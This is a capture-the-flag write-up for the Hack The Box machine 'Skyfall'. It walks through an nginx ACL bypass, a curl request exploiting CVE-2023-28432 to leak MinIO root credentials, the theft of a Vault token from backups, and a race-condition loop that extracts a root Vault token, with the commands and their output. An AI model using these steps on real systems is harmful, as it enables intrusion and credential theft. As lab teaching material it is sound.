---
icon: skyatlas
---

# HTB-SKYFALL

<figure><img src="../../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

#### **Attack Flow Explanation**

**1. Initial Access**

1. **Demo Application** – The target hosted a demo web application.
2. **Filter Bypass** – Input filtering was bypassed to reveal internal application behavior and access additional endpoints.
3. **Backend Information Disclosure** – Discovered backend server details via the bypass.
4. **CVE-2023-28432** – This vulnerability was exploited to leak **environment variables**, including credentials.
5. **Admin Access to MinIO** – Using leaked credentials, logged in as an **admin** to the MinIO storage service, gaining access to all stored files.
6. **Retrieve Backups** – Found backups containing a `.bashrc` file with **Vault credentials**.
7. **One-Time SSH Password** – From Vault, obtained a one-time SSH password, enabling login as **askyy**.

**2. Privilege Escalation**

8. **Race Condition in `seal-unvault`** – Exploited a race condition in the `seal-unvault` process to extract **Vault credentials for root**.
9. **One-Time SSH Password for Root** – Used the new Vault credentials to generate another one-time SSH password and gained access as **root**.

***

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Skyfall - Introducing Sky Storage!
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan with **nmap** shows only two open ports and the **HTTP** title hints towards some kind of _online_ storage.

<figure><img src="../../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

The webpage shows a welcome screen for the _future of data management with Sky Storage_. The team section exposes three email addresses `jbond@skyfall.htb`, `askyy@skyfall.htb`, and `btanner@skyfall.htb`. Additionally one is supposed to email `contact@skyfall.com` if there are any questions.\
There’s also a demo section that points towards `demo.skyfall.htb` leading me to add this and the domain from the mails to my `/etc/hosts`.

### Initial Access <a href="#initial-access" id="initial-access"></a>

The login prompt for the demo already mentions the needed credentials `guest:guest` and I can log straight in.

<figure><img src="../../../../.gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>

Through the dashboard I can access one file `Welcome.pdf` and upload _anything_, either by drag & drop or specifying a URL to fetch from. The **Beta Features** are access restricted and the **MinIO Metrics** just leads towards a 403 page. It seems possible to contact the administrator by using **Escalate** but it may take up to 24 hours to hear back.

\
As seen in the **nmap** scan and by inspecting the response from the server, there’s a **nginx** reverse proxy in place - the footer mentions **Flask** as backend.

<figure><img src="../../../../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>

Sometimes **nginx** ACL rules can be bypassed by adding characters that are **not** removed by nginx for the check but then later ignored by the backend server<sup>1</sup>. There are multiple characters to try, among those `\x0c`, `\x0a`, and `\x09` and adding one of those to the `/metrics` endpoint returns a status code **200** instead of 403.

<figure><img src="../../../../.gitbook/assets/image (340).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>

Using `%0A` in the address bar lets me bypass the check easily in **Firefox** and I can access the metrics page. There are all kinds of information regarding **MinIO** available, notably the version `2023-03-13T19:46:17Z` and the endpoint url `http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster`.\
Apparently there are at least two known vulnerabilities for that version<sup>2</sup> and there are PoCs available for [CVE-2023-28432](https://github.com/acheiii/CVE-2023-28432), an information disclosure vulnerability, and [CVE-2023-28434](https://github.com/AbelChe/evil_minio), a remote code execution vulnerability.



In order to use the information disclosure vulnerability I just have to send a **POST** request to `http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify` and the application will happily return its configuration.

```python

curl -X POST "http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify" | jq .
{
  "MinioEndpoints": [
    {
      "Legacy": false,
      "SetCount": 1,
      "DrivesPerSet": 4,
      "Endpoints": [
        {
          "Scheme": "http",
          "Opaque": "",
          "User": null,
          "Host": "minio-node1:9000",
          "Path": "/data1",
          "RawPath": "",
          "OmitHost": false,
          "ForceQuery": false,
          "RawQuery": "",
          "Fragment": "",
          "RawFragment": "",
          "IsLocal": false
        },
        {
          "Scheme": "http",
          "Opaque": "",
          "User": null,
          "Host": "minio-node2:9000",
          "Path": "/data1",
          "RawPath": "",
          "OmitHost": false,
          "ForceQuery": false,
          "RawQuery": "",
          "Fragment": "",
          "RawFragment": "",
          "IsLocal": true
        },
        {
          "Scheme": "http",
          "Opaque": "",
          "User": null,
          "Host": "minio-node1:9000",
          "Path": "/data2",
          "RawPath": "",
          "OmitHost": false,
          "ForceQuery": false,
          "RawQuery": "",
          "Fragment": "",
          "RawFragment": "",
          "IsLocal": false
        },
        {
          "Scheme": "http",
          "Opaque": "",
          "User": null,
          "Host": "minio-node2:9000",
          "Path": "/data2",
          "RawPath": "",
          "OmitHost": false,
          "ForceQuery": false,
          "RawQuery": "",
          "Fragment": "",
          "RawFragment": "",
          "IsLocal": true
        }
      ],
      "CmdLine": "http://minio-node{1...2}/data{1...2}",
      "Platform": "OS: linux | Arch: amd64"
    }
  ],
  "MinioEnv": {
    "MINIO_ACCESS_KEY_FILE": "access_key",
    "MINIO_BROWSER": "off",
    "MINIO_CONFIG_ENV_FILE": "config.env",
    "MINIO_KMS_SECRET_KEY_FILE": "kms_master_key",
    "MINIO_PROMETHEUS_AUTH_TYPE": "public",
    "MINIO_ROOT_PASSWORD": "GkpjkmiVmpFuL2d3oRx0",
    "MINIO_ROOT_PASSWORD_FILE": "secret_key",
    "MINIO_ROOT_USER": "5GrE1B2YGGyZzNHZaIww",
    "MINIO_ROOT_USER_FILE": "access_key",
    "MINIO_SECRET_KEY_FILE": "secret_key",
    "MINIO_UPDATE": "off",
    "MINIO_UPDATE_MINISIGN_PUBKEY": "RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"
  }
}

```

The credentials obtained let me login to **MinIO** with [mc](https://min.io/docs/minio/linux/reference/minio-mc-admin.html#mc-admin-install). Therefore I add a new alias `skyfall` by providing the url, user and password. Those values will be stored in a config in my home directory.

```python

# Download mc
curl https://dl.min.io/client/mc/release/linux-amd64/mc -o mc && chmod +x mc
 
# Configure new host skyfall
./mc config host add skyfall http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0

```

The [documentation](https://min.io/docs/minio/linux/reference/minio-mc.html) provides an extensive overview of the actions I can perform. In order to list all files in **MinIO** `ls` is used and additionally I can specify `--recursive` and `--versions` to list the whole tree and all available versions.

```python

./mc ls skyfall --recursive --versions
[2023-11-08 05:59:15 CET]     0B askyy/
[2023-11-08 06:35:28 CET]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT askyy/Welcome.pdf
[2023-11-09 22:37:25 CET] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT askyy/home_backup.tar.gz
[2023-11-09 22:37:09 CET] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT askyy/home_backup.tar.gz
[2023-11-09 22:36:30 CET] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT askyy/home_backup.tar.gz
[2023-11-08 05:58:56 CET]     0B btanner/
[2023-11-08 06:35:36 CET]  48KiB STANDARD null v1 PUT btanner/Welcome.pdf
[2023-11-08 05:58:33 CET]     0B emoneypenny/
[2023-11-08 06:35:56 CET]  48KiB STANDARD null v1 PUT emoneypenny/Welcome.pdf
[2023-11-08 05:58:22 CET]     0B gmallory/
[2023-11-08 06:36:02 CET]  48KiB STANDARD null v1 PUT gmallory/Welcome.pdf
[2023-11-08 01:08:01 CET]     0B guest/
[2023-11-08 01:08:05 CET]  48KiB STANDARD null v1 PUT guest/Welcome.pdf
[2023-11-08 05:59:05 CET]     0B jbond/
[2023-11-08 06:35:45 CET]  48KiB STANDARD null v1 PUT jbond/Welcome.pdf
[2023-11-08 05:58:10 CET]     0B omansfield/
[2023-11-08 06:36:09 CET]  48KiB STANDARD null v1 PUT omansfield/Welcome.pdf
[2023-11-08 05:58:45 CET]     0B rsilva/
[2023-11-08 06:35:51 CET]  48KiB STANDARD null v1 PUT rsilva/Welcome.pdf

```

From the output of the command it looks like everyone has access to the _same_ **Welcome.pdf** and just `askyy` has uploaded something else. Three versions of `home_backup.tar.gz` sound interesting to me because they might contain credentials or even **SSH** keys. To check them out, I do download all three with `mc cp` while adding the `--version-id`.

```python
./mc cp --version-id 2b75346d-2a47-4203-ab09-3c9f878466b8 skyfall/askyy/home_backup.tar.gz home_backup.tar.gz
...d.skyfall.htb/askyy/home_backup.tar.gz: 2.64 KiB / 2.64 KiB
 
# Extract the archive
mkdir home_backup && tar -C home_backup -xf home_backup.tar.gz
 
ls home_backup
-rw-rw-r-- 1 sn0x  sn0x    1 Nov  9  2023 .bash_history
-rw-r--r-- 1 sn0x  sn0x  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 sn0x  sn0x 3953 Nov  9  2023 .bashrc
drwx------ 2 sn0x  sn0x 4096 Oct  9  2023 .cache
-rw-r--r-- 1 sn0x  sn0x  807 Jan  6  2022 .profile
drwx------ 2 sn0x  sn0x 4096 Nov  9  2023 .ssh
-rw-r--r-- 1 sn0x  sn0x    0 Oct  9  2023 .sudo_as_admin_successful
 
cat ./home_backup/.bashrc
--- SNIP ---
export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
--- SNIP ---
```

The backup file with ID `2b75346d-2a47-4203-ab09-3c9f878466b8` includes a `.bashrc` file with two environment variables and those likely belong to [Vault](https://developer.hashicorp.com/vault). The interaction with **Vault** is done with a binary available on their [website](https://developer.hashicorp.com/vault/install#Linux). Instead of `VAULT_API_ADDR` the client does use `VAULT_ADDR`<sup>3</sup> and for some reason ignores the `VAULT_TOKEN` variable at first so I have to provide it during the login on the commandline.

```python
./vault login
Token (will be hidden): 
WARNING! The VAULT_TOKEN environment variable is set! The value of this
variable will take precedence; if this is unwanted please unset VAULT_TOKEN or
update its value accordingly.
 
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.
 
Key                  Value
---                  -----
token                hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
token_accessor       rByv1coOBC9ITZpzqbDtTUm8
token_duration       431115h10m39s
token_renewable      true
token_policies       ["default" "developers"]
identity_policies    []
policies             ["default" "developers"]
```

A post on [StackOverflow](https://stackoverflow.com/questions/70234255/how-to-identify-what-paths-can-be-accessed-with-what-capabilities-in-hashicorp-v) shows a way on how to list all the paths on the API that I can access via the client.

```python
./vault read sys/internal/ui/resultant-acl --format=json|jq -r .data
{
  "exact_paths": {
    "auth/token/lookup-self": {
      "capabilities": [
        "read"
      ]
    },
    "auth/token/renew-self": {
      "capabilities": [
        "update"
      ]
    },
    "auth/token/revoke-self": {
      "capabilities": [
        "update"
      ]
    },
    "ssh/creds/dev_otp_key_role": {
      "capabilities": [
        "create",
        "read",
        "update"
      ]
    },
    "sys/capabilities-self": {
      "capabilities": [
        "update"
      ]
    },
    "sys/control-group/request": {
      "capabilities": [
        "update"
      ]
    },
    "sys/internal/ui/resultant-acl": {
      "capabilities": [
        "read"
      ]
    },
    "sys/leases/lookup": {
      "capabilities": [
        "update"
      ]
    },
    "sys/leases/renew": {
      "capabilities": [
        "update"
      ]
    },
    "sys/policy/developers": {
      "capabilities": [
        "read"
      ]
    },
    "sys/renew": {
      "capabilities": [
        "update"
      ]
    },
    "sys/tools/hash": {
      "capabilities": [
        "update"
      ]
    },
    "sys/wrapping/lookup": {
      "capabilities": [
        "update"
      ]
    },
    "sys/wrapping/unwrap": {
      "capabilities": [
        "update"
      ]
    },
    "sys/wrapping/wrap": {
      "capabilities": [
        "update"
      ]
    }
  },
  "glob_paths": {
    "cubbyhole/": {
      "capabilities": [
        "create",
        "delete",
        "list",
        "read",
        "update"
      ]
    },
    "ssh/": {
      "capabilities": [
        "list"
      ]
    },
    "sys/tools/hash/": {
      "capabilities": [
        "update"
      ]
    }
  },
  "root": false
}// Some code
```

Most interesting to me seems `ssh/creds/dev_otp_key_role` and the online research eventually brought me to [One-time SSH passwords](https://developer.hashicorp.com/vault/tutorials/secrets-management/ssh-otp). The policy that is needed for this closely resembles the capabilities that I do have over the `dev_otp_key_role`.

Providing a username and the IP to connect to `vault write ssh/creds/dev_otp_key_role` returns a `key` to use as password for **SSH**. Doing so for user `askyy` lets me login and collect the first flag.

```python
./vault write ssh/creds/dev_otp_key_role ip=10.129.230.158 username=askyy
Key                Value
---                -----
lease_id           ssh/creds/dev_otp_key_role/0ZcAhFjJ9SNfm6LS5ZYZEYAE
lease_duration     768h
lease_renewable    false
ip                 10.129.230.158
key                b5a95138-27a8-b58f-30ae-48a10fa56e95
key_type           otp
port               22
username           askyy
 
ssh -o PubkeyAuthentication=no askyy@10.129.230.158
(askyy@10.129.230.158) Password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
 
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
 
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.
 
To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
askyy@skyfall:~$
```

> Hint
>
> As a faster alternative it’s also possible to use the `vault ssh` command and initiate a SSH connection directly<sup>4</sup>.
>
> ```python
> ./vault ssh -role dev_otp_key_role -mode otp -strict-host-key-checking=no asky
> ```

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

The user `askyy` can run one command as _any_ user: `/root/vault/vault-unseal` and optionally specify a few command line parameters. Running the file with `-h` (for help) explains the other commandline parameters, `-v` for verbose, `-d` for debug, and `-c` to specify the configuration file.

```python
sudo -ln
Matching Defaults entries for askyy on skyfall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
User askyy may run the following commands on skyfall:
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
```

When running with the `-d` flag a new file called `debug.log` is created in the current working directory but it’s only readable by `root` himself. When I create my own file first and then run `vault-unseal` I get the same outcome.

> Note
>
> In a previous version of this box chown did not happen and it was possible to read the `debug.log` right away if it was created by `askyy` prior to the execution.

Using [pspy](https://github.com/DominicBreuker/pspy) to listen to filesystem events I can observe that the log file is deleted, created, opened, modified several times before it’s closed again. That means even though I create the file, it will be deleted but this opens up a **race-condition** between the deletion and recreation of the log file.

```python
./pspy64 --dirs /home/askyy --fsevents --recursive_dirs ''
2025/04/22 18:59:04 FS:               DELETE | /home/askyy/debug.log
2025/04/22 18:59:04 FS:               CREATE | /home/askyy/debug.log
2025/04/22 18:59:04 FS:                 OPEN | /home/askyy/debug.log
2025/04/22 18:59:04 FS:               MODIFY | /home/askyy/debug.log
2025/04/22 18:59:04 FS:               MODIFY | /home/askyy/debug.log
2025/04/22 18:59:04 FS:               MODIFY | /home/askyy/debug.log
2025/04/22 18:59:04 FS:          CLOSE_WRITE | /home/askyy/debug.log
```

The host does not have any terminal multiplexer, so I open two more SSH sessions to abuse the race-condition. Those three sessions will do the following in a **while** loop:

* Create a file `debug.log` in the current directory with **touch**
* Try to read the file `debug.log` with **cat**
* Execute the `vault-unseal` command

If everything goes according to plan a log file, readable by my user, will be created right after the deletion took place but before the `vault-unseal` command creates the new log file. In that case I should be able to read the contents of the file before it will be deleted again and the cycle repeats.

```python
# Session 1: Create the file
while true; do touch /home/askyy/debug.log 2>/dev/null; done
 
# Session 2: Read the file
while true; do cat /home/askyy/debug.log 2>&1 | grep -iv "Permission denied"; done
 
# Session 3: Call the vault-unseal in /home/askyy
while true; do sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd; done
```

Bingo, that worked and after a few seconds session #2 prints the content of the `debug.log` exposing a master token for **Vault**.

```
2025/04/22 19:13:17 Reading: /etc/vault-unseal.yaml
2025/04/22 19:13:17 Security Risk!
2025/04/22 19:13:17 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
2025/04/22 19:13:17 Found Vault node: http://prd23-vault-internal.skyfall.htb
2025/04/22 19:13:17 Check interval: 5s
2025/04/22 19:13:17 Max checks: 5
2025/04/22 19:13:17 Establishing connection to Vault...
2025/04/22 19:13:17 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
2025/04/22 19:13:17 Checking seal status
2025/04/22 19:13:17 Vault sealed: false
```

Repeating the login process to **Vault** with the new token allows me to access the `admin_otp_key_role` and I use that to connect as root and collect the final flag.

```python
./vault list "ssh/roles"
Keys
----
admin_otp_key_role
dev_otp_key_role
 
./vault ssh -role admin_otp_key_role -mode otp -strict-host-key-checking=no root@skyfall.htb
```

<figure><img src="../../../../.gitbook/assets/complete (30).gif" alt=""><figcaption></figcaption></figure>
